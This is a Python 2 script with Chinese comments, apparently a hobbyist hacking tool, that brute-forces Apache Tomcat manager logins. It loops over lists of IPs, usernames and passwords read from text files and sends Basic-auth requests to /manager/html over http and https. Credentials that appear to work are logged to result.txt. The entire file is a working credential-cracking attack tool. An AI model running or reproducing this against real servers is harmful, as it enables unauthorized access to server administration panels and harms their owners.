#!/usr/bin/python
# -*- coding: UTF-8 -*-




import base64 
import urllib2

listip = []
listuser =  []
listpassword =  []




suffix = "/manager/html"
prefix= ['http://','https://']



# 破解tomcat 
# url 要破解的url地址
# ip 填充Host
# 
def geturl(url,ip,basestr,user,password):
    print url
    print ip
    print basestr
    print user
    print password
    headers = { 'Host':''+ip,
                'Connection':'keep-alive',
                'Cache-Control':'max-age=0',
                'Authorization':'Basic '+basestr,
                'Accept': 'text/html, */*; q=0.01',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36',
                'DNT':'1',
                'Referer': 'http://example.com/',
                'Accept-Encoding': 'gzip, deflate, sdch',
                'Accept-Language': 'zh-CN,zh;q=0.8,ja;q=0.6'
    }
    data = None
    req = urllib2.Request(url, data, headers)
    try:
        response = urllib2.urlopen(req,timeout = 3) # 超时时间 可自己修改
        strcode = response.code
        print u'code:'+str(strcode)
        if strcode == 200: # 如果状态码 ==200 疑似存在  如果对方服务器器统一返回200错误   所以 就算是服务器返回200 也不确定是破解成功了
            pass
            html = response.read()
            if("/manager/images/tomcat.gif" in html ): #  tomcat 默认logo
                msg = "[*]破解成功   "+ip+"  "+user+"  "+password
                print u"破解成功"
                wirtefile("result.txt",msg)
    except Exception, ex: 
        print u'破解失败'
        print ex
        pass # 如果出现异常 就证明有问题  不管他 



# 破解tomcat
def cracktomcat():
    global listip 
    global listuser 
    global listpassword 
    global prefix
    # 循环ip地址
    for ips in listip:
        # 循环用户名
        for users in listuser:
            pass
            # 循环密码
            for passwords in listpassword:
                pass
                for prefixs in prefix: # 循环协议
                    basestr =  base64.b64encode(users+":"+passwords)
                    url = prefixs+ips+suffix
                    geturl(url,ips,basestr,users,passwords)
                    print '----'
    

# 写文件
# 将破解成功的用户名和密码写入到该文件中
def wirtefile(filepath,msg):
    f = open(filepath,'a+')
    f.write(msg+"\n")
    f.close()
    


def readfile(filepath):
    list = []
    f = open(filepath,'r')
    for lines in f:
        list.append(lines.replace('\n',''))
        
    return list
    
#         print lines.replace('\n','')
    
    
if __name__ == '__main__':
#     global listip 
#     global listuser 
#     global listpassword 
    print u"""
            这里要显示很NB的LOGO!!
            --By Na0z1buHa0
    
    """
    listip = readfile("ip.txt")
    listuser =  readfile("user.txt")
    listpassword =  readfile("password.txt")
    #wirtefile('resule.txt',"1231231212321")
    cracktomcat()
    print u'执行结束'
    print u"""
            这里要显示很NB的LOGO!!
            --By Na0z1buHa0
    
    """


















